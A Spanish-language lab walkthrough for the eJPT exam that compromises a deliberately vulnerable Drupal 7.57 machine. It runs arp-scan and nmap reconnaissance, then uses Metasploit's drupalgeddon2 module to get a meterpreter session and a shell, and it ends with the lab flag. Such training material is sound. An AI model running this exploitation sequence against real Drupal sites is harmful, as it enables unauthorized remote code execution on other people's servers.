
-----
- TAG: #Evaluación #Vulnerabilidades #Entornos #Drupal
---

Continuamos con el hacking en entornos **CMS**, específicamente en **Drupal**, una alternativa a **WordPress** que también es susceptible a vulnerabilidades, y que podría aparecer en el examen eJPT.

Practicaremos con una máquina **Drupal** especialmente preparada para este ejemplo.

## Preparativos

1. **Máquina atacante**: Kali Linux
2. **Máquina víctima**: Una máquina vulnerable de la comunidad de hacking ético. Puedes descargarla desde este [enlace a Máquina FakeNews](https://mega.nz/file/DH4CgILC#ygeHP981BASaKqrjJNFP3evopnu8yH5kx2zl0EGt11k).

### Configuración

1. Importa la máquina víctima en VirtualBox.
2. Configura el adaptador de red en modo puente.

Una vez iniciado, debemos hacer un reconocimiento desde nuestra máquina Kali Linux utilizando `arp-scan`:

```bash
arp-scan -I eth0 --localnet
```

Verifica la conectividad con la máquina víctima usando `ping`:

```bash
ping -c 1 1.2.3.4
```

Si el TTL indica que es una máquina Linux, pasamos a escanearla con `nmap` para identificar vulnerabilidades:

```bash
nmap -p- -sS -sC -sV --open --min-rate=500 -vvv -n -Pn 1.2.3.4 -oN escaneo
```

El escaneo nos mostrará que los puertos 80 y 22 están abiertos. Sabemos que el puerto 80 está asociado con Drupal, un CMS comúnmente utilizado.

La versión de **Drupal** encontrada es crucial, ya que en el examen es vital identificar las versiones vulnerables. Podríamos utilizar **Metasploit** para encontrar exploits asociados.

Primero, revisemos el contenido del puerto 80. Veremos una página simple con un mensaje de Fake News. Como ya identificamos la versión de Drupal (`/drupal-7.57`), podemos acceder directamente a esta ruta:

```bash
http://1.2.3.4/drupal-7.57
```

Una vez dentro, es recomendable confirmar la versión de Drupal. Si no está visible, inspecciona el código fuente (Ctrl + U) para buscar la versión.

Ahora, con esta información, abrimos **Metasploit** (recomendado abrirlo desde el menú en el examen):

```bash
msfconsole
```

Buscamos exploits específicos para la versión de Drupal:

```bash
search drupal 7
```

Encontraremos varios métodos vulnerables, siendo uno de los más conocidos `drupalgeddon2`. Este exploit es común en los exámenes, así que lo utilizaremos.

Selecciona el exploit usando su índice (por ejemplo, `use 1`).

```bash
use 1
```

Configura las opciones necesarias:

```bash
show options
```

En `RHOSTS`, especifica la dirección IP de la máquina víctima. Asegúrate de configurar el puerto correcto para `RPORT` (en este caso, 80).

```bash
set RHOSTS http://1.2.3.4/drupal-7.57/
```

Ejecuta el ataque:

```bash
run
```

Una vez finalizado, deberías tener acceso a un `meterpreter`. Si deseas navegar por los directorios, escalar privilegios o visualizar archivos, ejecuta el comando `shell`:

```bash
shell
```

Si el prompt no aparece, ejecuta:

```bash
bash -i
```

La flag es:

```
LaNu3vaInf0rm4c10n3sF4ls4
```

---

